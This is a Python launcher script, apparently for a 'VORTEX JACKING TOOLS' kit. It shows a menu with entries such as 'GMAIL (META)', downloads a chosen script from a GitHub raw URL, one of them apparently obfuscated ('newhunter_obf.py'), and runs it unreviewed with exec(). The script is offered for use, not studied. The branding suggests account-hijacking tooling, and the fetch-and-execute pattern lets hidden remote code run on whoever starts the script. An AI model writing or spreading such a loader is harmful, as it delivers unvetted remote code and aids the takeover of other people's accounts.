import os
import sys
import datetime
import shutil
from cfonts import render  
from rich.console import Console
from rich.table import Table
import requests
columns, _ = shutil.get_terminal_size()
border = "═" * (columns - 2) 
kral = render('VORTEX', colors=['red', 'yellow'], align='center')
print(f"\033[1;31m╔{border}╗")  
print(kral)  
print(f"\033[1;36m       🕵️‍♂️ JACKING TOOLS   |   🛠️ Developer: @PRAYAGRAJJ   | 🌐 @VORTEXCODEZ    ")  
print(f"\033[1;31m╚{border}╝\n")  
console = Console()
table = Table(title="🔥 VIP Control Panel", style="bold green", expand=True)
table.add_column("🔢 No.", justify="center", style="bold cyan", no_wrap=True)
table.add_column("⚡ Feature Name", style="bold yellow")
table.add_column("🟢 Status", justify="center", style="bold green")
options = [
    ("1️⃣", "📜  GMAIL (META)","   ✅ Active"),
    ("3️⃣", "🐃  OLD TOOL","   ✅ Active"),
    ("3️⃣", "📧  Reset Tool", "    ❌ Inactive"),
]
for num, feature, status in options:
    table.add_row(num, feature, status)
console.print(table)
import requests
# Dictionary mapping numbers (1-10) to different script URLs
script_links = {
    1:"https://raw.githubusercontent.com/jaikshaikh/Vortexcodes/refs/heads/main/newhunter_obf.py",
    2:"https://raw.githubusercontent.com/jaikshaikh/Vortexcodes/refs/heads/main/VIP%20old.py"
}

def fetch_and_execute(choice):
    """Fetch and execute the selected script"""
    if choice in script_links:
        url = script_links[choice]
        try:
            script_content = requests.get(url).text
            exec(script_content, globals())  # Execute in global scope
            if "VORTEX" in globals():
                VORTEX()  # Call VORTEX only if it exists
            else:
                print("⚠️ Warning: VORTEX() is not defined in the script.")
        except Exception as e:
            print(f"❌ Error fetching/executing the script: {e}")
    else:
        print("❌ Invalid choice! Please select a number between 1 and 10.")

# Get user input
try:
    user_choice = int(input("Enter a number (1-10) to select a script: "))
    os.system('clear')
    fetch_and_execute(user_choice)
except ValueError:
    print("❌ Invalid input! Please enter a number between 1 and 10.")
